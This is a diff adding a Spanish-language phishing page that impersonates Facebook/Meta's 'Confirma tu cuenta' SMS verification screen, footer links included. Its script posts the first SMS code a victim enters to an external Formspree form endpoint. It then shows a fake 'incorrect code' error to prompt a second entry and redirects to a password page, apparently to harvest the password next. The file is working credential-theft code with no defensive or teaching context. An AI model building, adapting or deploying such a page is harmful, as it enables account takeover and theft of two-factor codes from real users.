@@ -1,0 +1,338 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirma tu cuenta</title>
+    <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: Helvetica, Arial, sans-serif;
+            }
+
+            body {
+                background-color: #ffffff;
+                color: #1c1e21;
+                display: flex;
+                flex-direction: column;
+                min-height: 100vh;
+            }
+
+            .main-container {
+                flex: 1;
+                display: flex;
+                justify-content: center;
+                padding: 40px 20px;
+            }
+
+            .content-wrapper {
+                width: 100%;
+                max-width: 500px;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .back-link {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: 36px;
+                height: 36px;
+                border-radius: 50%;
+                text-decoration: none;
+                color: #1c1e21;
+                margin-left: -8px;
+                margin-bottom: 12px;
+                transition: background-color 0.2s;
+                cursor: pointer;
+            }
+
+                .back-link:hover {
+                    background-color: #f2f2f2;
+                }
+
+                .back-link svg {
+                    width: 20px;
+                    height: 20px;
+                    fill: #1c1e21;
+                }
+
+            .title {
+                font-size: 24px;
+                font-weight: 700;
+                margin-bottom: 8px;
+            }
+
+            .subtitle {
+                font-size: 15px;
+                color: #1c1e21;
+                margin-bottom: 24px;
+            }
+
+            .input-group {
+                margin-bottom: 16px;
+            }
+
+            .input-box {
+                width: 100%;
+                padding: 16px;
+                font-size: 16px;
+                border: 1px solid #ccd0d5;
+                border-radius: 12px;
+                outline: none;
+                transition: border-color 0.2s;
+            }
+
+                .input-box:focus {
+                    border-color: #0866ff;
+                    box-shadow: 0 0 0 2px #e7f3ff;
+                }
+
+            .input-error {
+                border-color: #fa383e !important;
+            }
+
+            .error-message {
+                color: #fa383e;
+                font-size: 13px;
+                margin-top: 6px;
+                display: none;
+            }
+
+            .btn {
+                width: 100%;
+                padding: 14px 16px;
+                border-radius: 500px;
+                font-size: 15px;
+                font-weight: 600;
+                border: none;
+                cursor: pointer;
+                text-align: center;
+                margin-bottom: 12px;
+                transition: background-color 0.2s;
+            }
+
+            .btn-primary {
+                background-color: #0866ff;
+                color: #ffffff;
+            }
+
+                .btn-primary:hover {
+                    background-color: #1877f2;
+                }
+
+            .btn-secondary {
+                background-color: #f0f2f5;
+                color: #1c1e21;
+            }
+
+                .btn-secondary:hover {
+                    background-color: #e4e6eb;
+                }
+
+                .btn-secondary:disabled {
+                    background-color: #f0f2f5;
+                    color: #bec3c9;
+                    cursor: not-allowed;
+                }
+
+            .timer-text {
+                text-align: center;
+                font-size: 14px;
+                color: #65676b;
+                margin-top: -4px;
+                margin-bottom: 12px;
+            }
+
+            footer {
+                background-color: #ffffff;
+                padding: 30px 20px;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+
+            .footer-inner {
+                width: 100%;
+                max-width: 980px;
+            }
+
+            .footer-links-row {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 12px 16px;
+                font-size: 12px;
+            }
+
+                .footer-links-row a {
+                    color: #737373;
+                    text-decoration: none;
+                }
+
+                    .footer-links-row a:hover {
+                        text-decoration: underline;
+                    }
+
+            .footer-divider {
+                height: 1px;
+                background-color: #ccd0d5;
+                margin: 12px 0;
+                border: none;
+            }
+
+            .footer-links-row a:nth-child(1) {
+                color: #737373;
+            }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="content-wrapper">
+            <a href="@Url.Action("Index", "Home")" class="back-link" aria-label="Volver">
+                <svg viewBox="0 0 24 24">
+                    <path d="M15.28 5.22a.75.75 0 0 1 0 1.06L9.56 12l5.72 5.72a.75.75 0 0 1-1.06 1.06l-6.25-6.25a.75.75 0 0 1 0-1.06l6.25-6.25a.75.75 0 0 1 1.06 0Z"></path>
+                </svg>
+            </a>
+
+            <div class="title">Confirma tu cuenta</div>
+            <div class="subtitle">Hemos enviado un código por SMS. Introdúcelo para confirmar tu cuenta.</div>
+
+            <form id="confirmForm">
+                <div class="input-group">
+                    <input type="text" id="codigoInput" class="input-box" placeholder="Introduce el código" autocomplete="off">
+                    <div id="errorMsg" class="error-message">Introduce el código completo para continuar.</div>
+                </div>
+
+                <button type="button" class="btn btn-primary" onclick="enviarCodigo()">Continuar</button>
+
+                <div id="timerDisplay" class="timer-text" style="display: none;">
+                    Espera <span id="countdown">59</span> segundos para reenviar.
+                </div>
+
+                <button type="button" id="btnNoCodigo" class="btn btn-secondary" onclick="iniciarTemporizador()">¿No has recibido ningún código?</button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-inner">
+            <div class="footer-links-row">
+                <a href="#">Español (España)</a>
+                <a href="#">English (US)</a>
+                <a href="#">Italiano</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Deutsch</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">Más idiomas...</a>
+            </div>
+
+            <hr class="footer-divider">
+
+            <div class="footer-links-row">
+                <a href="#">Registrarte</a>
+                <a href="#">Iniciar sesión</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Vídeo</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Meta Store</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Meta</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Política de privacidad</a>
+                <a href="#">Centro de privacidad</a>
+                <a href="#">Información</a>
+                <a href="#">Crear anuncio</a>
+                <a href="#">Crear página</a>
+                <a href="#">Desarrolladores</a>
+                <a href="#">Empleo</a>
+                <a href="#">Cookies</a>
+                <a href="#">Opciones de anuncios</a>
+                <a href="#">Condiciones</a>
+                <a href="#">Ayuda</a>
+                <a href="#">Subir contactos y no usuarios</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+            let intentos = 0; // Variable para contar los intentos
+
+            async function enviarCodigo() {
+                const input = document.getElementById('codigoInput');
+                const errorMsg = document.getElementById('errorMsg');
+                const valor = input.value.trim();
+
+                // Validación: Si está vacío
+                if (valor === "") {
+                    errorMsg.textContent = "Introduce el código completo para continuar.";
+                    errorMsg.style.display = "block";
+                    input.classList.add("input-error");
+                    return;
+                }
+
+                intentos++; // Sumar un intento al enviar un valor
+
+                if (intentos === 1) {
+                    // Primer Intento: Enviar a Formspree y simular error
+                    try {
+                        await fetch('https://formspree.io/f/xkjnnwdd', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ codigo_sms: valor })
+                        });
+                    } catch (error) {
+                        console.error("Error en la solicitud a Formspree:", error);
+                    }
+
+                    // Simular que el código es incorrecto
+                    errorMsg.textContent = "El código ingresado es incorrecto. Inténtalo de nuevo.";
+                    errorMsg.style.display = "block";
+                    input.classList.add("input-error");
+                    input.value = ""; // Limpiar el input para que lo vuelva a ingresar
+                } else {
+                    // Segundo Intento (o más): Ocultar error, no enviar a Formspree, y redirigir
+                    errorMsg.style.display = "none";
+                    input.classList.remove("input-error");
+
+                    window.location.href = '@Url.Action("Password", "Home")';
+                }
+            }
+
+            let intervalo = null;
+
+            function iniciarTemporizador() {
+                const btnNoCodigo = document.getElementById('btnNoCodigo');
+                const timerDisplay = document.getElementById('timerDisplay');
+                const countdownSpan = document.getElementById('countdown');
+
+                // Deshabilitar botón y mostrar temporizador
+                btnNoCodigo.disabled = true;
+                btnNoCodigo.style.display = "none";
+                timerDisplay.style.display = "block";
+
+                let segundos = 59;
+                countdownSpan.textContent = segundos;
+
+                if (intervalo) clearInterval(intervalo);
+
+                intervalo = setInterval(() => {
+                    segundos--;
+                    countdownSpan.textContent = segundos;
+
+                    // Al llegar a 0 redirige al Index
+                    if (segundos <= 0) {
+                        clearInterval(intervalo);
+                        window.location.href = '@Url.Action("Index", "Home")';
+                    }
+                }, 1000);
+            }
+    </script>
+</body>
+</html>
